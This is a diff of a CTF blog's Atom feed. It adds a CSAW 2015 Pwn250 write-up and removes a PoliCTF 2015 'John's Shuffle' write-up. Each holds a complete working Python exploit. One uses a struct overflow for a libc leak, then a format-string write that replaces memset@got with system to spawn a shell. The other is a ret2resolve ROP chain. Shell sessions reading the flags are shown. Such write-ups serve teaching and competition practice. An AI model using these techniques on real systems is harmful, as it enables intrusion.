@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Pwnable | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/pwnable/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-09-22T00:08:41+02:00</updated>
+  <updated>2015-09-22T23:07:26+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,620 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[CSAW 2015 - Pwn250]]></title>
+    <link href="http://barrebas.github.io/blog/2015/09/22/csaw-2015-pwn250/"/>
+    <updated>2015-09-22T23:00:00+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/09/22/csaw-2015-pwn250</id>
+    <content type="html"><![CDATA[<p>This CTF marked our team&rsquo;s anniversary! We managed to pop this pwnable.</p>
+
+<!--more-->
+
+
+<p>We&rsquo;re given a 32-bit ELF binary, which uses malloc() and free(). Must be some kind of heap vulnerability then, right?</p>
+
+<p>The binary is some kind of contact storage. We can enter names, phone numbers and descriptions. The name gets stored in the .bss segment, while the phone number and description are stored on the heap. We can overflow the name field like so:</p>
+
+<pre><code>Menu:
+1)Create contact
+2)Remove contact
+3)Edit contact
+4)Display contacts
+5)Exit
+&gt;&gt;&gt; 1
+Contact info: 
+    Name: BARREBAS
+[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
+    Enter Phone No: 0  
+    Length of description: 100       
+    Enter description:
+        BLEH
+Menu:
+1)Create contact
+2)Remove contact
+3)Edit contact
+4)Display contacts
+5)Exit
+&gt;&gt;&gt; 4
+Contacts:
+    Name: BARREBAS
+    Length 100
+    Phone #: 0
+    Description: BLEH
+Menu:
+1)Create contact
+2)Remove contact
+3)Edit contact
+4)Display contacts
+5)Exit
+&gt;&gt;&gt; 3
+Name to change? BARREBAS
+1.Change name
+2.Change description
+&gt;&gt;&gt; 1
+New name: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Menu:
+1)Create contact
+2)Remove contact
+3)Edit contact
+4)Display contacts
+5)Exit
+&gt;&gt;&gt; 4
+Contacts:
+    Name: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+    Length 1111638594
+    Phone #: 0
+    Description: BLEH
+</code></pre>
+
+<p>So suppose the struct looked something like</p>
+
+<pre><code class="c">struct {
+    char *phoneNumber;  // malloc'ed
+    char *description;  // malloc'ed
+    char name[64];
+    int descriptionLength;
+    int valid;
+} info_t;
+</code></pre>
+
+<p>We can use this to leak information by overwriting the <strong>next</strong> struct&rsquo;s <em>phoneNumber</em> and <em>description</em>. We cannot use this to write anything, as the program will automatically call free() on the description. If it doesn&rsquo;t contain a valid heap address, the binary will crash. First, we&rsquo;ll abuse the leak to determine the remote libc version.</p>
+
+<pre><code class="python">from socket import *
+import struct, telnetlib, re, sys, time
+
+def readtil(delim):
+    buf = b''
+    while not delim in buf:
+      buf += s.recv(1)
+    return buf
+
+def sendln(b):
+    s.send(b + b'\n')
+
+def sendbin(b):
+    s.sendall(b)
+
+def p(x):
+    return struct.pack('&lt;L', x &amp; 0xffffffff)
+
+def leak(x):
+    print "leaking " + hex(x)
+    global last_addr
+    # edit contact 1 -&gt; name to overflow pointers
+    sendln('3')
+    readtil('change? ')
+    if last_addr == 0:
+        sendln('BAR1')
+    else:
+        sendln('B'*63)
+
+    readtil('&gt;&gt;&gt; ')
+    sendln('1')
+    readtil('name:')
+    #       name          length valid  char *description // char *phone==leak-&gt;malloc@got  
+    sendln('B'*63+"\x00"+"BBBB"+p(0)+p(x)+p(x)+"BAR2")
+    last_addr = x
+
+    readtil('&gt;&gt;&gt; ')
+
+    sendln('4')
+    data = readtil('&gt;&gt;&gt; ')
+    m = re.findall('Phone #: (.*)', data)
+    return m[0]
+
+def leak4(x):
+    return struct.unpack('I', leak(x)[0:4])[0]
+
+def pwn():
+    global s
+    global last_addr
+    last_addr = 0
+    s=socket(AF_INET, SOCK_STREAM)
+    #s.connect(('127.0.0.1', 4444))
+    s.connect(('54.165.223.128', 2555))
+    readtil('&gt;&gt;&gt; ')
+
+    # create contact 1
+    sendln('1')
+    readtil('Name: ')
+    sendln('BAR1')
+    readtil('Phone No: ')
+    sendln('0')
+    readtil('description: ')
+    sendln('100')
+    readtil('description:')
+    sendln('BLEH')
+
+    readtil('&gt;&gt;&gt; ')
+
+    # create contact 2
+    sendln('1')
+    readtil('Name: ')
+    sendln('BAR2')
+    readtil('Phone No: ')
+    sendln('1')
+    readtil('description: ')
+    sendln('100')
+    readtil('description:')
+    sendln('BLAH')
+
+    readtil('&gt;&gt;&gt; ')
+
+    malloc = leak4(0x804b020)
+    print "[+] malloc @ " + hex(malloc)
+    puts = leak4(0x804b024)
+    print "[+] puts   @ " + hex(puts)
+</code></pre>
+
+<p>This gave us two addresses, and <a href="http://libcdb.com/">libcdb.com</a> gave us no less than five options. We logged back into the server for pwn100, which had a different IP address so was probably a differnent box. We figured that the CTF organizers used the same base image for each box. The symbols of the libc on pwn100&rsquo;s box seemed to match what we found via the leak and we just got the address of system from that machine.</p>
+
+<p>Now, we needed a way to write to the got. Turns out there was another format string vulnerability in the description field:</p>
+
+<pre><code>Menu:
+1)Create contact
+2)Remove contact
+3)Edit contact
+4)Display contacts
+5)Exit
+&gt;&gt;&gt; 1
+Contact info: 
+    Name: BAR1
+[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
+    Enter Phone No: 0
+    Length of description: 100
+    Enter description:
+        %X-%X-%X-%X-%X-%X
+Menu:
+1)Create contact
+2)Remove contact
+3)Edit contact
+4)Display contacts
+5)Exit
+&gt;&gt;&gt; 4
+Contacts:
+    Name: BAR1
+    Length 100
+    Phone #: 0
+    Description: 9B24008-F77724E0-F7771FF4-0-0-FFDE40D8
+Menu:
+1)Create contact
+2)Remove contact
+3)Edit contact
+4)Display contacts
+5)Exit
+&gt;&gt;&gt;
+</code></pre>
+
+<p>We used the same trick as in <a href="https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-echoes/">ekoparty&rsquo;s echoes binary</a>, selecting a stack address (actually a saved stack frame pointer) which points to another stack address, which we can then use to write out an address on the stack. Finally, use that third format string argument to write anything anywhere.</p>
+
+<p>We then use the leak to determine libc&rsquo;s base address, add the offset for system, and finally overwrite memset@got with system. Then, once we delete an element with name <code>/bin/sh</code>, we in fact call <code>system('/bin/sh')</code> and we win.</p>
+
+<p>Without further ado:</p>
+
+<pre><code class="python">from socket import *
+import struct, telnetlib, re, sys, time
+
+def readtil(delim):
+    buf = b''
+    while not delim in buf:
+      buf += s.recv(1)
+    return buf
+
+def sendln(b):
+    s.send(b + b'\n')
+
+def sendbin(b):
+    s.sendall(b)
+
+def p(x):
+    return struct.pack('&lt;L', x &amp; 0xffffffff)
+
+
+def write(x, i):
+    # first, leak address to which we'll write ($30) so that we can align the writes to $30
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('ZZZZ%18$.08xBBBB')
+    readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    data = readtil('&gt;&gt;&gt; ')
+    m = re.findall('ZZZZ(.*)BBBB', data)
+
+    addr = m[0].decode('hex')
+    addr = struct.unpack('&gt;I', addr)[0]
+    start = addr &amp; 0xff
+
+# setup $30 to x (addr to write) via $18 by first setting $6-&gt;$18
+#-----------
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str(start+1) + 'c%6$hhn')
+    readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ') 
+
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str((x &gt;&gt; 8) &amp; 0xff)+'c%18$hhn')
+    readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+#-----------
+#-----------
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str(start+2) + 'c%6$hhn')
+    readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str((x &gt;&gt; 16) &amp; 0xff)+'c%18$hhn')
+#   readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+#-----------
+#-----------
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str(start+3) + 'c%6$hhn')
+    readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str((x &gt;&gt; 24) &amp; 0xff)+'c%18$hhn')
+    readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+#-----------
+
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str(start) + 'c%6$hhn')
+    #readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str(x &amp; 0xff)+'c%18$hhn')
+    #readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+
+# start writing bytes       
+#---write first byte
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str(i &amp; 0xff) + 'c%30$hhn')
+    #readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+
+
+    sendln('3')
+    readtil('change?')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt;')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str((x+1) &amp; 0xff)+'c%18$hhn')
+    #readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str((i &gt;&gt; 8) &amp; 0xff) + 'c%30$hhn')
+    readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str((x+2) &amp; 0xff)+'c%18$hhn')
+    #readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str((i &gt;&gt; 16) &amp; 0xff) + 'c%30$hhn')
+    readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str((x+3) &amp; 0xff)+'c%18$hhn')
+    #readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+
+    sendln('3')
+    readtil('change? ')
+    sendln('BAR4')
+    readtil('&gt;&gt;&gt; ')
+    sendln('2')
+    readtil('iption:')
+    sendln('1000')
+    readtil('iption:')
+    sendln('%'+str((i &gt;&gt; 24) &amp; 0xff) + 'c%30$hhn')
+    readtil('&gt;&gt;&gt; ')
+    sendln('4')
+    readtil('&gt;&gt;&gt; ')
+
+
+def leak(x):
+    print "leaking " + hex(x)
+    global last_addr
+    # edit contact 1 -&gt; name to overflow pointers
+    sendln('3')
+    readtil('change? ')
+    if last_addr == 0:
+        sendln('BAR1')
+    else:
+        sendln('B'*63)
+
+    readtil('&gt;&gt;&gt; ')
+    sendln('1')
+    readtil('name:')
+    #       name   len    valid   char *description==write1-&gt;free@got // char *phone==leak1-&gt;malloc@got  
+    sendln('B'*63+"\x00"+"BBBB"+p(0)+p(x)+p(x)+"BAR2")
+    last_addr = x
+
+    readtil('&gt;&gt;&gt; ')
+
+    sendln('4')
+    data = readtil('&gt;&gt;&gt; ')
+    m = re.findall('Phone #: (.*)', data)
+    return m[0]
+
+def leak4(x):
+    return struct.unpack('I', leak(x)[0:4])[0]
+
+def pwn():
+    global s
+    global last_addr
+    last_addr = 0
+    s=socket(AF_INET, SOCK_STREAM)
+    #s.connect(('127.0.0.1', 4444))
+    s.connect(('54.165.223.128', 2555))
+    readtil('&gt;&gt;&gt; ')
+
+    # create contact 1
+    sendln('1')
+    readtil('Name: ')
+    sendln('BAR1')
+    readtil('Phone No: ')
+    sendln('0')
+    readtil('description: ')
+    sendln('100')
+    readtil('description:')
+    sendln('BLEH')
+
+    readtil('&gt;&gt;&gt; ')
+
+    # create contact 2
+    sendln('1')
+    readtil('Name: ')
+    sendln('BAR2')
+    readtil('Phone No: ')
+    sendln('1')
+    readtil('description: ')
+    sendln('100')
+    readtil('description:')
+    sendln('BLAH')
+
+    readtil('&gt;&gt;&gt; ')
+
+    # create contact 3 (used in write)
+    sendln('1')
+    readtil('Name: ')
+    sendln('BAR4')
+    readtil('Phone No: ')
+    sendln('1')
+    readtil('description: ')
+    sendln('100')
+    readtil('description:')
+    sendln('BLAH')
+
+    readtil('&gt;&gt;&gt; ')
+
+    # create contact 4 (used as payload for system())
+    sendln('1')
+    readtil('Name: ')
+    sendln('/bin/sh')
+    readtil('Phone No: ')
+    sendln('1')
+    readtil('description: ')
+    sendln('100')
+    readtil('description:')
+    sendln('BLAH')
+
+    readtil('&gt;&gt;&gt; ')
+
+    # 00064c10 W puts
+    # 00075b30 malloc
+    # 0004cc40 T print
+
+
+    malloc = leak4(0x804b020)
+    print "[+] malloc @ " + hex(malloc)
+
+    libc = malloc - 0x0075b30
+    print "[+] libc @ " + hex(libc)
+
+    # 0003fcd0 W system
+    system = libc + 0x003fcd0
+
+    print "[+] system @ " + hex(system)
+
+    print "[+] overwriting memset@got with system the hard way"
+    write(0x804b03c, system)
+
+    print "[+] deleting element"
+
+    sendln('2')
+    readtil('remove?')
+    sendln('/bin/sh')
+
+
+    t=telnetlib.Telnet()
+    t.sock =s 
+    t.interact()
+
+
+    s.close()
+pwn()
+</code></pre>
+
+<p>And in action:</p>
+
+<pre><code>bas@tritonal:~/bin/csaw15/pwn250$ python ./pwn250poc.py 
+leaking 0x804b020
+[+] malloc @ 0xf7619b30
+[+] libc @ 0xf75a4000
+[+] system @ 0xf75e3cd0
+waiting...
+[+] overwriting memset@got with system the hard way
+writing 0x804b03c
+['ffade868']
+0x68
+
+    Menu:
+1)Create contact
+2)Remove contact
+3)Edit contact
+4)Display contacts
+5)Exit
+&gt;&gt;&gt; 
+[+] deleting element
+Name to remove? /bin/sh
+id
+uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
+cd 
+ls
+contacts_54f3188f64e548565bc1b87d7aa07427
+flag
+cat flag
+flag{f0rm47_s7r1ng5_4r3_fun_57uff}
+</code></pre>
+
+<p>Gotta love format string vulnerabilities. The flag was <code>flag{f0rm47_s7r1ng5_4r3_fun_57uff}</code>.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[CAMP CTF - Dkm]]></title>
@@ -1022,171 +1636,6 @@ shell
 cat flag.txt
 CAMP15_408eed038796cfca32e2fdb3a8126429
 </code></pre>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[PoliCTF 2015 - John's Shuffle]]></title>
-    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle/"/>
-    <updated>2015-07-12T17:06:29+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle</id>
-    <content type="html"><![CDATA[<p>John&rsquo;s Shuffle was a 350 point pwnable for PoliCTF 2015. Here&rsquo;s how I cracked it!</p>
-
-<!--more-->
-
-
-<p>Again, it&rsquo;s a 32 bit ELF binary. Running it yields the following:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/polictf/johns-shuffle$ ./johns-shuffle 
-It all began as a mistake..
-
-
-It all began as a mistake..
-
-
-It all began as a mistake..
-</code></pre>
-
-<p>Not very useful. The disassembly provided some hints, for it had functions like <code>shuffle</code>, <code>unshuffle</code> and <code>bubblesort</code>. The program kicks off by clearing a lot of stack space and calling <code>unshuffle</code>. Then, it asks for user input, maximum size 0x44 bytes. I decided to enter 0x44 * <code>A</code> (what else?).</p>
-
-<pre><code>    ... clear stack space ...
- 8048f30: call   8048df0 &lt;unshuffle&gt;
- 8048f35: mov    DWORD PTR [esp],0x804b078
- 8048f3c: call   8048710 &lt;puts@plt&gt;
- 8048f41: mov    eax,ds:0x804b0c0
- 8048f46: mov    DWORD PTR [esp],eax
- 8048f49: call   80486c0 &lt;fflush@plt&gt;
- 8048f4e: mov    eax,ds:0x804b0a0
- 8048f53: mov    DWORD PTR [esp+0x8],eax
- 8048f57: mov    DWORD PTR [esp+0x4],0x44
- 8048f5f: lea    eax,[esp+0x2c]
- 8048f63: mov    DWORD PTR [esp],eax
- 8048f66: call   80486e0 &lt;fgets@plt&gt;
-</code></pre>
-
-<p>When runnning the <code>shuffle</code> function, the program executes <code>system()</code>, which spawns <code>/bin/dash</code> on my system, effectively stopping me from debugging it in <code>gdb</code>. I patched system in gdb so it would return immediately and I could trace the program. Turns out <code>shuffle</code> takes the GOT entries, all the function pointers, and shuffles them around. <code>unshuffle</code> negates this operation. After the second time I entered 0x44 A&rsquo;s, the program crashed with control over EIP and EBP:</p>
-
-<pre><code>gdb-peda$ start
-Temporary breakpoint 2, 0x08048ec2 in main ()
-gdb-peda$ p system
-$2 = {&lt;text variable, no debug info&gt;} 0xf7e9ac30 &lt;system&gt;
-gdb-peda$ set *0xf7e9ac30=0xc3
-gdb-peda$ c
-It all began as a mistake..
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-
-It all began as a mistake..
-
-It all began as a mistake..
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-
-Program received signal SIGSEGV, Segmentation fault.
-[----------------------------------registers-----------------------------------]
-EAX: 0x0 
-EBX: 0xf7fbeff4 --&gt; 0x15fd7c 
-ECX: 0x4 
-EDX: 0x80487a6 (&lt;difftime@plt+6&gt;:   push   0x88)
-ESI: 0x0 
-EDI: 0x0 
-EBP: 0x41414141 ('AAAA')
-ESP: 0xffffd5c0 ('A' &lt;repeats 31 times&gt;)
-EIP: 0x41414141 ('AAAA')
-EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-Invalid $PC address: 0x41414141
-[------------------------------------stack-------------------------------------]
-0000| 0xffffd5c0 ('A' &lt;repeats 31 times&gt;)
-0004| 0xffffd5c4 ('A' &lt;repeats 27 times&gt;)
-0008| 0xffffd5c8 ('A' &lt;repeats 23 times&gt;)
-0012| 0xffffd5cc ('A' &lt;repeats 19 times&gt;)
-0016| 0xffffd5d0 ('A' &lt;repeats 15 times&gt;)
-0020| 0xffffd5d4 ('A' &lt;repeats 11 times&gt;)
-0024| 0xffffd5d8 ("AAAAAAA")
-0028| 0xffffd5dc --&gt; 0x414141 ('AAA')
-[------------------------------------------------------------------------------]
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-0x41414141 in ?? ()
-gdb-peda$ 
-</code></pre>
-
-<p>Cool, easy control over EIP. However, at this point, we cannot rely on the GOT entries, because they are still shuffled! We can&rsquo;t just ret2system. I spent some time trying to return to <code>unshuffle</code>, but kept losing control of the program execution.</p>
-
-<p>But let&rsquo;s take a step back here. Linux ELF binaries employ something called &ldquo;lazy linking&rdquo;. When a binary is started, the symbols are not resolved yet. Only when a function is called for the first time will the function address be resolved. The GOT entry will be pointing to this look up code (memcpy as example):</p>
-
-<pre><code>080486d0 &lt;memcpy@plt&gt;:
- 80486d0:   ff 25 1c b0 04 08       jmp    DWORD PTR ds:0x804b01c 
- 80486d6:   68 20 00 00 00          push   0x20
- 80486db:   e9 a0 ff ff ff          jmp    8048680 &lt;_init+0x2c&gt;
-</code></pre>
-
-<p>When called for the first time, <code>0x804b01c</code> will be pointing to <code>0x80486d6</code>, which will kick off the function resolver. So instead of using <code>0x80486d0</code> to do a memcpy, I&rsquo;d just use <code>0x80486d6</code>. This bypasses the mess that <code>shuffle</code> made!</p>
-
-<p>With all this in hand, I wrote an exploit and the corresponding rop chain (well&hellip; more like ret2resolve ;)).</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib, re, sys, time
-
-def readtil(delim):
-    buf = b''
-    while not delim in buf:
-        buf += s.recv(1)
-    return buf
-
-def sendln(b):
-    s.send(b + b'\n')
-
-def sendbin(b):
-    s.sendall(b)
-
-def p(x):
-    return struct.pack('&lt;L', x &amp; 0xffffffff)
-
-def pwn():
-    global s
-    s=socket(AF_INET, SOCK_STREAM)
-    s.connect(('shuffle.polictf.it', 80))
-
-    readtil('mistake..')
-
-    rop = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-    rop += p(0x8048696) # resolve -&gt; read (so we can read in `/bin/sh`)
-    rop += p(0x804901d) # pppr
-    rop += p(0)         # stdin
-    rop += p(0x804b130) # free mem area
-    rop += p(0x10)
-    rop += p(0x8048726) # resolve -&gt; system
-    rop += p(0x8048746) # resolve -&gt; exit (makes rasta_mouse happy!)
-    rop += p(0x804b130) # arg for system; will contain /bin/sh in a few moments
-
-    sendln(rop)
-
-    readtil('mistake..')
-    sendln(rop)
-    readtil('mistake..')
-    sendln(rop)
-
-    sendln('/bin/sh')
-    t = telnetlib.Telnet()
-    t.sock = s
-
-    t.interact()
-
-    s.close()
-
-pwn()
-</code></pre>
-
-<pre><code class="bash">bas@tritonal:~/tmp/polictf/johns-shuffle$ python poc.py 
-
-id
-uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
-cat /home/ctf/*
-flag{rand0mizing_things_with_l0ve}
-cat: /home/ctf/johnshuffle: Permission denied
-</code></pre>
-
-<p>Easy peasy! The flag was <code>flag{rand0mizing_things_with_l0ve}</code>. Nice!</p>
 ]]></content>
   </entry>
   
